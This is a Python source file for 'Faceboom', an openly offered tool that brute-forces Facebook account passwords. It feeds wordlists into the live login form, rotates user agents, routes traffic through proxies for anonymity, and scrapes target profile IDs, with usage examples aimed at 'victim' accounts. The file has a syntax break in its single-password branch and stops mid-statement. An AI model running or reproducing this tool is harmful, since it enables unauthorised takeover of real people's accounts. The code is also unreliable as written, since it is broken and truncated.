#!/usr/bin/python
# -*- coding: utf-8 -*-

##################################
# Program Name: Faceboom ~ v 1.1.0
# Working : Brute Force Attack on Facebook Accounts
# Author : Hassan Tahir
##################################


# Imported Libraries

import socket
import time
import os
import optparse
import random
import re
import requests
import mechanize

os.system("cls||clear")

# Colors

wi="\033[1;37m" 
rd="\033[1;31m" 
gr="\033[1;32m" 
yl="\033[1;33m" 


# Hosting Secure Connection

def check_internet():
   try:
      socket.create_connection(("www.google.com", 80))
      return True
   except OSError:
      pass
   return False


# Checking Proxy and Ports

def check_proxy(ip, port=None):
    proxies = {'https': f"https://{ip}:{port}", 'http': f"http://{ip}:{port}"}
    try:
        r = requests.get('https://www.wikipedia.org', proxies=proxies, timeout=5)
        if ip == r.headers['X-Client-IP']:
            return True
        else:
            return False
    except Exception:
        return False


# Choice Random User-Agent supporting browser

def user_agent():
    useragents = [
           'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) RockMelt/0.9.58.494 Chrome/11.0.696.71 Safari/534.24',
           'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36',
           'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.54 Safari/535.2',
           'Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.348; U; en) Presto/2.5.25 Version/10.54',
           'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.12 Safari/535.11',
           'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.6 (KHTML, like Gecko) Chrome/16.0.897.0 Safari/535.6',
           'Mozilla/5.0 (X11; Linux x86_64; rv:17.0) Gecko/20121202 Firefox/17.0 Iceweasel/17.0.1']
    return random.choice(useragents)


# Fetching Victim Profile ID

def get_profile_id(url):
    try:
        idre = re.compile('"entity_id":"([0-9]+)"')
        con = requests.get(url).content
        idis = idre.findall(con)
        print(gr+"\n["+wi+"*"+gr+"] Target Profile"+wi+" ID: "+yl+idis[0]+wi)
        return idis[0]
    except IndexError:
        print(rd+"\n["+yl+"!"+rd+"] Error:"+yl+" Please Check Your Victem Profile URL "+rd+"!!!"+wi)
        exit(1)


# Brute Force Main Frame

def brute_force(username, wordlist, proxy=None, passwd=None):
    if not os.path.isfile(wordlist):
        print(rd+"\n["+yl+"!"+rd+"] Error:"+yl+" No Such File: [ "+rd+str(wordlist)+yl+" ] "+rd+"!!!"+wi)
        exit(1)
    if not check_internet():
        print(rd+"\n["+yl+"!"+rd+"] Error:"+yl+" Please Check Your Internet Connection "+rd+"!!!"+wi)
        exit(1)

    useproxy = False
    proxystatus = yl+"["+rd+"OFF"+yl+"]"

    if proxy:
        print(wi+"["+yl+"~"+wi+"] Connecting To Proxy[\033[1;33m {} \033[1;37m]...".format(proxy))
        ip, port = proxy.split(":")
        if check_proxy(ip, port):
            print(wi+"["+gr+"Connected"+wi+"]")
            useproxy = proxy
            proxystatus = gr+ip+wi+":"+yl+port+wi+ " ["+gr+"ON"+wi+"]"
        else:
            print(rd+"["+yl+"Connection Failed"+rd+"] !!!"+wi)
            print(rd+"\n["+yl+"!"+rd+"] Error:"+yl+" Invalid HTTP/S Proxy["+rd+str(proxy)+yl+"]"+rd+" !!!"+wi)
            exit(1)

    print(gr+"""
----------------------------------
[---]        """+wi+"""Faceboom"""+gr+"""         [---]
----------------------------------
[---]  """+wi+"""Brute Forcing Facebook  """+gr+""" [---]
----------------------------------
[---]         """+yl+"""CONFIG"""+gr+"""         [---]
----------------------------------
[>] Target      :> """+wi+username+gr+"""
{}""".format("[>] Wordlist    :> "+yl+str(wordlist) if passwd==None else "[>] Password    :> "+yl+str(passwd))+gr+"""
[>] ProxyStatus :> """+str(proxystatus)+gr+"""      
----------------------------------"""+wi+"""
[~] """+yl+"""Brute"""+rd+""" Force Attack: """+gr+"""Enabled """+wi+"""[~]"""+gr+"""
----------------------------------
""")

    loop = 1
    br = mechanize.Browser()
    br.set_handle_robots(False)
    if useproxy:
        br.set_proxies({'https': useproxy, 'http': useproxy})
    br.addheaders = [('User-agent', user_agent())]
    issuccess = 0

    if passwd:
        if not passwd.strip() or len(passwd) < 6:
            print(yl+"\n["+rd+"!"+yl+"] Invalid Password [ "+rd+passwd+yl+" ]"+rd+" !!!"+wi)
            exit(1)
        passwd = passwd.strip()
        try:
            print(wi+"["+yl+"~"+wi+"] Trying Single Password[ {"+yl+str(passwd)+wi+"} ]")
            br.open("https://www.facebook.com")
            br.select_form(nr=0)
            br.form["email"] = username
            br.form["pass"] = passwd
            br.method = "POST"
            if br.submit().get_data().__contains__('home_icon'):
                issuccess = 1
                print(wi+"==> Login"+gr+" Success\n")
                print(wi+"========================="+"="*len(passwd)+"======")
                print(wi+"["+gr+"+"+wi+"] Password [ "+gr+passwd+
                print(wi+passwd+wi+" ]"+gr+" Is Correct :)")
                print(wi+"========================="+"="*len(passwd)+"======")
            else:
                print(yl+"==> Login"+rd+" Failed\n")
        except(KeyboardInterrupt, EOFError):
            print(rd+"\n["+yl+"!"+rd+"]"+yl+" Aborting"+rd+"..."+wi)
            time.sleep(1.5)
            issuccess = 2
        except Exception as e:
            issuccess = 2
            print(rd+"\n["+yl+"!"+rd+"] Error: "+yl+str(e)+wi)
            time.sleep(0.60)

        if issuccess == 0:
            print(yl+"\n["+rd+"!"+yl+"] Sorry: "+wi+"The Password[ "+yl+passwd+wi+" ] Is Not Correct"+rd+":("+yl+"!"+wi)
            print(gr+"["+yl+"!"+gr+"]"+yl+" Please Try other password or Wordlist File "+gr+":)"+wi)
        exit(1)

    with open(wordlist) as wfile:
        for passwd in wfile:
            if not passwd.strip() or len(passwd.strip()) < 6:
                continue
            passwd = passwd.strip()
            try:
                print(wi+"["+yl+str(loop)+wi+"] Trying Password[ {"+yl+str(passwd)+wi+"} ]")
                br.open("https://facebook.com")
                br.select_form(nr=0)
                br.form["email"] = username
                br.form["pass"] = passwd
                br.method = "POST"
                if br.submit().get_data().__contains__('home_icon'):
                    issuccess = 1
                    print(wi+"==> Login"+gr+" Success\n")
                    print(wi+"========================="+"="*len(passwd))
                    print(wi+"["+gr+"+"+wi+"] Password "+gr+"Found:"+wi+">>>>[ "+gr+"{}".format(passwd))
                    print(wi+"========================="+"="*len(passwd))
                    break
                else:
                    print(yl+"==> Login"+rd+" Failed\n")
                loop += 1
            except (KeyboardInterrupt, EOFError):
                print(rd+"\n["+yl+"!"+rd+"]"+yl+" Aborting"+rd+"..."+wi)
                time.sleep(1.5)
                exit(1)
            except Exception as e:
                print(rd+"["+yl+"!"+rd+"] Error: "+yl+str(e)+wi)
                time.sleep(0.60)

    if issuccess == 0:
        print(yl+"\n["+rd+"!"+yl+"] Sorry: "+wi+"I Can't Find The Correct Password In [ "+yl+wordlist+wi+" ] "+rd+":("+yl+"!"+wi)
        print(gr+"["+yl+"!"+gr+"]"+yl+" Please Try Other Wordlist File "+gr+":)"+wi)
    exit(1)

parser = optparse.OptionParser(wi+"""
Usage: python ./faceboom.py [OPTIONS...]
-------------
OPTIONS:
       |
    |--------    
    | -t <target email> [OR] <FACEBOOK ID>    ::> Specify target Email [OR] Target Profile ID
    |--------
    | -w <wordlist Path>                      ::> Specify Wordlist File Path
    |--------
    | -s <single password>                     ::> Specify Single Password To Check
    |--------
    | -p <Proxy IP:PORT>                      ::> Specify HTTP/S Proxy (Optional)
    |--------
    | -g <TARGET Facebook Profile URL>        ::> Specify Target Facebook Profile URL For Get HIS ID
-------------
Examples:
        |
     |--------
     | python faceboom.py -t victim@gmail.com -w wlist.txt
     |--------
     | python Faceboom.py -t 40000057893246323 -w wlist.txt
     |--------
     | python faceboom.py -t victim@gmail.com -w wlist.txt -p 165.227.35.11 default(port=8080,80) 
     |--------
     | python faceboom.py -t victim@gmail.com -s 1234567
     |-------- 
     | python faceboom.py -g https://www.facebook.com/victim-username 
     |-------- 
""")
def main():
    parser.add_option("-t","--target",'-T','--TARGET',dest="target_email",type="string",
        help="Specify Target Email ")
    parser.add_option("-w","--wordlist",'-W','--WORDLIST',dest="wordlist_path",type="string",
        help="Specify Wordlist File ")
    parser.add_option("-s","--singe","--S","--SINGLE",dest="single_password",type="string",
        help="Specify Single Password To Check it")
    parser.add_option("-p","-P","--proxy","--PROXY",dest="proxy_ip",type="string",
                        help="Specify HTTP/S Proxy To Be Anonymous When Attack Enable")
    parser.add_option("-g","-G","--getid","--GETID",dest="profile_url",type="string",
                        help="Specify TARGET FACEBOOK PROFILE URL")
    (options,args) = parser.parse_args()
    if options.target_email and options.wordlist_path and options.proxy_ip:
        username = options.target_email
        wordlist = options.wordlist_path
        proxy = options.proxy_ip
        brute_force(username, wordlist, proxy=proxy)
    elif options.target_email and options.single_password and options.proxy_ip:
        username = options.target_email
        passwd = options.single_password
        proxy = options.proxy_ip
        brute_force(username, "", passwd=passwd, proxy=proxy)
    elif options.target_email and options.single_password:
        username = options.target_email
        passwd = options.single_password
        brute_force(username, "", proxy=None, passwd=passwd)
    elif options.target_email
